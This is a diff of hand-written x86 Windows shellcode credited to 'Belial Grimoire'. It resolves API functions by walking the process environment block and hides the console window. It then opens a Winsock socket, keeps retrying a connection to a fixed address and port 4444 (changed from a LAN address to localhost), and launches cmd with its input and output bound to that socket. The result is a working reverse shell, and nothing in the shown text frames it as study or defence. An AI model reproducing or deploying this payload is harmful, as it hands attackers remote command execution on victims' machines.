@@ -1,9 +1,13 @@
 ;////code by Belial Grimoire////
+;///bgpavelang.github.io////
 
-global _s
+global _start
+
 section .text
 
-_s:
+
+_start:
+
 
 xor ecx, ecx
 mov eax, [fs:ecx+0x30]
@@ -21,7 +25,44 @@ add edx, ebx
 mov esi, [edx+0x20]
 add esi, ebx
 
-J_Gp:
+push esi
+push edx
+push esi
+push edx
+
+xor ecx, ecx
+
+
+GPAdd:  
+
+inc ecx
+lodsd
+add eax, ebx
+cmp dword[eax], 0x50746547
+jnz GPAdd
+cmp dword[eax+4], 0x41636f72
+jnz GPAdd
+cmp dword[eax+8], 0x65726464
+jnz GPAdd
+
+dec ecx
+
+mov esi, [edx+0x24]
+add esi, ebx
+mov cx, [esi+ecx*2]
+mov esi, [edx+0x1c]
+add esi, ebx
+mov edx, [esi+ecx*4]
+add edx, ebx
+
+mov [ebp-4], edx
+
+pop edx
+pop esi
+
+xor ecx, ecx
+
+J_Gp:    
 inc ecx
 
 lodsd
@@ -36,86 +77,50 @@ dec ecx
 
 mov esi, [edx+0x24]
 add esi, ebx
-mov cx, [esi + ecx * 2]
+mov cx, [esi+ecx*2]
 mov esi, [edx+0x1c]
 add esi, ebx
 mov edx, [esi+ecx*4]
 add edx, ebx
 
-mov esi, edx ;GC
+mov edi, edx
+call edi
+mov edi, eax  
 
-call esi
-
-mov edi, eax
-
-xor ecx, ecx
-mov eax, [fs:ecx+0x30]
-mov eax, [eax+0xc]
-mov esi, [eax+0x14]
-lodsd
-xchg eax, esi
-lodsd
-mov ebx, [eax+0x10]
-
-mov edx, [ebx+0x3c]
-add edx, ebx
-mov edx, [edx+0x78]
-add edx, ebx
-mov esi, [edx+0x20]
-add esi, ebx
-
-J_Pr:
-inc ecx
-
-lodsd
-add eax, ebx
-cmp dword[eax], 0x50746547
-jnz J_Pr
-cmp dword[eax+0x4], 0x41636f72
-jnz J_Pr
-cmp dword[eax+0x8], 0x65726464
-jnz J_Pr
-dec ecx
-
-mov esi, [edx+0x24]
-add esi, ebx
-mov cx, [esi + ecx * 2]
-mov esi, [edx+0x1c]
-add esi, ebx
-mov edx, [esi+ecx*4]
-add edx, ebx
-
-mov esi, edx ;GePro
-
-xor ecx, ecx
-push ecx
-push 0x41797261
+xor edx, edx
+push edx
+push 0x41797261 
 push 0x7262694c
 push 0x64616f4c
 push esp
 push ebx
 
-call esi
+call [ebp-4]
 
-mov ebp, eax
+mov [ebp-8], eax
 
-xor ecx, ecx
-mov cx, 0x3233
-push ecx
+xor edx, edx
+mov dx, 0x6c6c  
+push edx
+push 0x642e3233
 push 0x72657375
 push esp
 
-call ebp
+call [ebp-8]
+
+xor edx, edx
 
 xor ecx, ecx
 mov cx, 0x776f
 push ecx
 push 0x646e6957
-push 0x776f6853
+push 0x776f6853   
 push esp
-push eax
+push eax          
 
-call esi
+call [ebp-4]      
+
+add esp, 0x28
 
 xor ecx, ecx
 push ecx
@@ -123,26 +128,32 @@ push edi
 
 call eax
 
-xor ecx, ecx
-push ecx
-mov cx, 0x3233
-push ecx
-push 0x5f327377
+
+xor edx, edx
+mov dx, 0x6c6c
+push edx
+push 0x642e3233
+push 0x5f327377 
 push esp
 
-call ebp
+call [ebp-8]
 
-mov ebp, eax
+mov esi, eax
+
+add esp, 0xc
 
 xor ecx, ecx
 push ecx
 mov cx, 0x7075
 push ecx
 push 0x74726174
-push 0x53415357
+push 0x53415357   
 push esp
-push ebp
-call esi
+push esi          
+
+call [ebp-4]     
+
+add esp, 0x10
 
 xor ecx, ecx
 mov cx, 0x0190
@@ -152,77 +163,72 @@ push ecx
 
 call eax
 
-xor eax, eax
-mov ax, 0x4174
-push eax
-push 0x656b636f
-push 0x53415357
-push esp
-push ebp
-call esi
-
-xor ebx, ebx
-
-push ebx
-push ebx
-push ebx
 xor ecx, ecx
-mov cl, 6
+mov cx, 0x4174
 push ecx
-inc ebx
-push ebx
-inc ebx
-push ebx
+push 0x656b636f
+push 0x53415357  
+push esp
+push esi          
+
+call [ebp-4]      
+
+xor edx, edx
+xor ecx, ecx
+push edx        
+push edx        
+push edx        
+mov dl, 6       
+push edx
+inc ecx
+push ecx        
+inc ecx
+push ecx        
 
 call eax
 
-xchg eax, edi
-ec:
-xor ebx, ebx
-mov ebx, 0x74636565
-shr ebx, 8
-push ebx
-push 0x6e6e6f63
+mov edi, eax
+
+brincar:
+xor ecx, ecx
+mov ecx, 0x74636565
+shr ecx, 8
+push ecx
+push 0x6e6e6f63    
 push esp
-push ebp
+push esi           
+      
+call [ebp-4]       
 
-call esi
+add esp, 0x14
 
-push 0x0d00a8c0
-push word 0x5c11
-xor ebx, ebx
-add bl, 2
-push word bx
-mov edx, esp
+xor ecx, ecx
+push 0x0100007f     
+push word 0x5c11    
+add cl, 2   
+push word cx        
 
-push byte 16
-push edx
-push edi
+xor ecx, ecx
+mov ecx, esp
+
+push byte 0x16     
+push ecx           
+push edi           
 
 call eax
 
 xor ecx, ecx
 cmp eax, ecx
-jnz ec
+jnz brincar     
 
+add esp, 0x198
+
+pop edx
+pop esi
 
 xor ecx, ecx
-mov eax, [fs:ecx+0x30]
-mov eax, [eax+0xc]
-mov esi, [eax+0x14]
-lodsd
-xchg eax, esi
-lodsd
-mov ebx, [eax+0x10]
 
-mov edx, [ebx+0x3c]
-add edx, ebx
-mov edx, [edx+0x78]
-add edx, ebx
-mov esi, [edx+0x20]
-add esi, ebx
-
-P_Pr:
+P_Pr:    
 inc ecx
 
 lodsd
@@ -237,23 +243,22 @@ dec ecx
 
 mov esi, [edx+0x24]
 add esi, ebx
-mov cx, [esi + ecx * 2]
+mov cx, [esi+ecx*2]
 mov esi, [edx+0x1c]
 add esi, ebx
 mov edx, [esi+ecx*4]
 add edx, ebx
 
-mov esi, edx ;ProcAd
+mov [ebp-10], edx
 
-mov edx, 0x646d6363
+xor edx, edx
+mov edx, 0x646d6363 
 shr edx, 8
 push edx
 mov ecx, esp
 
+xor esi, esi
 xor edx, edx
-
-sub esp, 16
-mov ebx, esp
 
 push edi
 push edi
@@ -263,77 +268,38 @@ push edx
 xor eax, eax
 inc eax
 rol eax, 8
-inc eax
 push eax
-push edx
-push edx
-push edx
-push edx
-push edx
-push edx
-push edx
-push edx
-push edx
-push edx
+push esi
+push esi
+push esi
+push esi
+push esi
+push esi
+push esi
+push esi
+push esi
+push esi
 xor eax, eax
 add al, 44
 push eax
 mov eax, esp
 
-push ebx
+xor edi, edi
+xor edx, edx
+sub esp, 0x16
+mov edx, esp
+
+push edx
 push eax
-push edx
-push edx
-push 0x08000000
+push edi
+push edi
+push edi
 xor eax, eax
 inc eax
 push eax
-push edx
-push edx
+push edi
+push edi
 push ecx
-push edx
+push edi
+call [ebp-10]
 
-call esi
-
-xor ecx, ecx
-mov eax, [fs:ecx+0x30]
-mov eax, [eax+0xc]
-mov esi, [eax+0x14]
-lodsd
-xchg eax, esi
-lodsd
-mov ebx, [eax+0x10]
-
-mov edx, [ebx+0x3c]
-add edx, ebx
-mov edx, [edx+0x78]
-add edx, ebx
-mov esi, [edx+0x20]
-add esi, ebx
-
-P_Ex:
-inc ecx
-
-lodsd
-add eax, ebx
-cmp dword[eax], 0x74697845
-jnz P_Ex
-cmp dword[eax+0x4], 0x6f725074
-jnz P_Ex
-cmp dword[eax+0x8], 0x73736563
-jnz P_Ex
-dec ecx
-
-mov esi, [edx+0x24]
-add esi, ebx
-mov cx, [esi + ecx * 2]
-mov esi, [edx+0x1c]
-add esi, ebx
-mov edx, [esi+ecx*4]
-add edx, ebx
-
-mov esi, edx ;ExtP
-
-xor edx, edx
-push edx
-call esi
